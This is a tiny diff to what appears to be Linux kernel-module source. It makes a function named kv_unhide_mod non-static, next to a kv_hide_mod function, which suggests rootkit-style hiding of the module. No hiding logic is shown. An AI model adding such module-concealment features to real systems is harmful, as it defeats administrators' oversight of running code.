@@ -258,7 +258,7 @@ static void kv_hide_mod(void)
  * executed, the recommended action is to proceed with the rmmod
  * command to unload the module safely.
  */
-static void kv_unhide_mod(void)
+void kv_unhide_mod(void)
 {
 	int err;
 	struct kobject *kobj;
